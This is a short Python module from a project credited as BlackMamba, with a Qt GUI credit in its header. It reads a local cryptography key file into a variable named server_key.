####################################################################################
# BLACKMAMBA BY: LOSEYS (https://github.com/loseys)
#
# QT GUI INTERFACE BY: WANDERSON M.PIMENTA (https://github.com/Wanderson-Magalhaes)
# ORIGINAL QT GUI: https://github.com/Wanderson-Magalhaes/Simple_PySide_Base
####################################################################################

"""
Sets the value of cryptography key to a variable.
"""

with open('bin/profile/crypt_key.txt', 'r') as f:
    server_key = f.read()
    f.close()
